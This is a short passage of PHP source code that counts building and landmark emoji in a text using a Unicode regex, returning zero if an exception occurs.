\x{1f3ef}|\x{1f54b}|\x{26e9}|\x{1f54d}|\x{1f6d5}|\x{1f54c}|\x{26ea}|\x{1f5fd}|\x{1f5fc}|\x{1f492}|\x{1f3f0}|\x{1f3ed}|\x{1f3e1}|\x{1f3ec}|\x{1f3eb}|\x{1f3ea}|\x{1f3e9}|\x{1f3e8}|\x{1f3e6}|\x{1f3e5}|\x{1f3e4}|\x{1f3e3}|\x{1f3e2}|\x{1f566}/u', $text, $matches );

			return count( $matches[ 0 ] );
		}
		catch ( Exception $e )
		{
			return 0;
		}
	}
}
